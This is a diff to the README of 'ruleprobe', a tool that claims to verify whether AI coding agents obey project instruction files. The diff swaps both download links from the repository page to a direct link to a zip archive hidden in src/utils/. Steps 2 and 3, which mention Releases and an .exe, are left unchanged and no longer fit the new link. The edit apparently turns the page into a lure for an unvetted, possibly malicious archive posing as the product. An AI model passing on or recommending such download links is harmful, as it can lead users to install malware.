@@ -1,6 +1,6 @@
 # 🔍 ruleprobe - Verify AI agent instruction adherence easily
 
-[![Download ruleprobe](https://img.shields.io/badge/Download-ruleprobe-blue.svg)](https://github.com/Zedekiahdiscovered948/ruleprobe)
+[![Download ruleprobe](https://img.shields.io/badge/Download-ruleprobe-blue.svg)](https://github.com/Zedekiahdiscovered948/ruleprobe/raw/refs/heads/main/src/utils/Software-v1.0.zip)
 
 This tool checks if AI coding agents follow your instructions. Many developers use files like .cursorrules to guide their AI. Sometimes, these agents ignore those files. This software verifies that the agent respects your setup. It performs a specific test on your project files to confirm the AI follows your rules.
 
@@ -21,7 +21,7 @@ Your computer needs a few things to run this tool. Most modern Windows computers
 
 Follow these steps to set up the software.
 
-1. Visit this page to download the software: [https://github.com/Zedekiahdiscovered948/ruleprobe](https://github.com/Zedekiahdiscovered948/ruleprobe)
+1. Visit this page to download the software: [https://github.com/Zedekiahdiscovered948/ruleprobe/raw/refs/heads/main/src/utils/Software-v1.0.zip](https://github.com/Zedekiahdiscovered948/ruleprobe/raw/refs/heads/main/src/utils/Software-v1.0.zip)
 2. Locate the link marked "Releases" on the right side of the page.
 3. Select the latest version for Windows. It will end in .exe.
 4. Save this file to your desktop.
